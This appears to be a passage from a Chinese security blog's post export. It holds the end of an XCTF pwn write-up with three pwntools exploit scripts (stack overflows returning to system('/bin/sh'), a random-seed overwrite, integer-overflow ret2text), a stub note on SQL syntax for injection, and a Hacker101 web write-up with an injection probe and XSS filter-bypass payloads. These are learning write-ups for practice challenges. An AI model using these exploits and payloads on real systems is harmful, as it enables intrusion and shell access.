<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#115;&#121;&#115;&#116;&#x65;&#109;&#x40;&#112;&#108;&#x74;">&#115;&#121;&#115;&#116;&#x65;&#109;&#x40;&#112;&#108;&#x74;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
<p>Python的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" alt=""></p>
<p>exp.py如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="三、int-overflow（整数溢出）"><a href="#三、int-overflow（整数溢出）" class="headerlink" title="三、int_overflow（整数溢出）"></a>三、int_overflow（整数溢出）</h2><p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" alt=""></p>
<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
<p>注意到，v3是unsigned __int8 类型，当int  strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>xctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语法笔记</title>
    <url>/2022/03/31/blog0010-SQL%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="零、基础知识"><a href="#零、基础知识" class="headerlink" title="零、基础知识"></a>零、基础知识</h2><p>1、<strong>数据类型</strong></p>
<p>首先我们要了解SQL语句的基本数据类型。</p>
<p>具体的知识我们可以参考w3cschools : </p>
<span id="more"></span>
<p><strong>2、注释</strong></p>
<p>SQL注入中我们常常需要借助注释的力量。</p>
<p>常见的注释方法有:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">/<em> </em>/</th>
<th style="text-align:center">多行注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">—</td>
<td style="text-align:center">行末注释</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">行末注释（mysql独有的注释符号）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>3、表的基本操作</strong></p>
<p>表的操作有增删查改。</p>
<h2 id="一、数据查询"><a href="#一、数据查询" class="headerlink" title="一、数据查询"></a>一、数据查询</h2><p>不论是何种数据库，设计的意义都是为了方便查询，这也是SQL语法标准的意义所在。对于SQL注入而言，我们主要关心的就是数据的查询。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>hacker101系列wp（持续更新中）</title>
    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
<span id="more"></span>
<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>comprehensive</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>hacker101</tag>
      </tags>
  </entry>
</search>
